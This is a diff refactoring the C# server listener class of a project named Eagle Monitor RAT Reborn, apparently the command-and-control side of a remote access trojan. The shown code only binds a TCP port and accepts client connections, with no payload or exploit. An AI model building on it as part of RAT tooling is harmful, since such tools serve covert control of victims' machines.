@@ -13,77 +13,71 @@ namespace Eagle_Monitor_RAT_Reborn.Network
 {
     internal class ServerHandler : IDisposable
     {
-        internal readonly static List<ServerHandler> Servers;
-        internal static int CurrentServersNumber { get { return Servers.Count; } }
-        internal static bool stopServer { get; set; }
-
         static ServerHandler()
         {
-            stopServer = false;
+            StopServer = false;
             Servers = new List<ServerHandler>();
+            acceptClientAsync = new AcceptClientAsync(AcceptClient);
         }
 
-        private int serverPort { get; set; }
+        internal readonly static List<ServerHandler> Servers;
+        internal static int CurrentServersNumber { get { return Servers.Count; } }
+        internal static bool StopServer { get; set; }
+
+        private static readonly AcceptClientAsync acceptClientAsync;
+        private delegate ClientHandler AcceptClientAsync(ServerHandler serverHandler);
+
+        #region "Non Static"
+        private int ServerPort { get; set; }
         internal Socket socket;
 
-        private delegate ClientHandler AcceptClient();
-        private readonly AcceptClient acceptClient;
-
-        internal ServerHandler() : base()
+        internal ServerHandler(int port) : base()
         {
             Servers.Add(this);
-            acceptClient = new AcceptClient(BeginClientAccepted);
-        }
-
-        internal bool Listen(int port)
-        {
-            serverPort = port;
+            ServerPort = port;
             IPEndPoint endPoint = new IPEndPoint(IPAddress.Any, port);
             socket = new Socket(endPoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
             try
             {
                 socket.Bind(endPoint);
                 socket.Listen(int.MaxValue);
-                AcceptClientAsync();
-                return true;
+                StartAcceptClient(this);
             }
             catch (Exception ex)
             {
                 MessageBox.Show(ex.ToString());
-                return false;
             }
         }
+        #endregion
 
-        internal void AcceptClientAsync()
+        private static void StartAcceptClient(ServerHandler serverHandler)
         {
-            acceptClient.BeginInvoke(new AsyncCallback(EndAcceptedClient), null);
+            acceptClientAsync.BeginInvoke(serverHandler, new AsyncCallback(EndAcceptClient), serverHandler);
         }
 
-        private ClientHandler BeginClientAccepted()
+        private static ClientHandler AcceptClient(ServerHandler serverHandler)
         {
-            if(!stopServer)
-                return new ClientHandler(socket.Accept(), this.serverPort);
+            if(!StopServer)
+                return new ClientHandler(serverHandler.socket.Accept(), serverHandler.ServerPort);
             else
                 return null;
         }
 
-        private void EndAcceptedClient(IAsyncResult ar)
+        private static void EndAcceptClient(IAsyncResult ar)
         {
-            try
-            {
-                acceptClient.EndInvoke(ar);
-
-                if (!stopServer)
-                    AcceptClientAsync();
-            }
-            catch  { this.Dispose(); }
+            acceptClientAsync.EndInvoke(ar);
+            ServerHandler serverHandler = (ServerHandler)ar.AsyncState;
+            if (!StopServer)
+                ServerHandler.StartAcceptClient(serverHandler);
+            else
+                serverHandler.Dispose();
         }
 
         public void Dispose() 
         {
-            socket.Close();
-            if (socket != null)
-                socket.Dispose();
+            this.socket.Shutdown(SocketShutdown.Both);
+            this.socket.Close();
+            this.socket?.Dispose();
         }
     }
 }
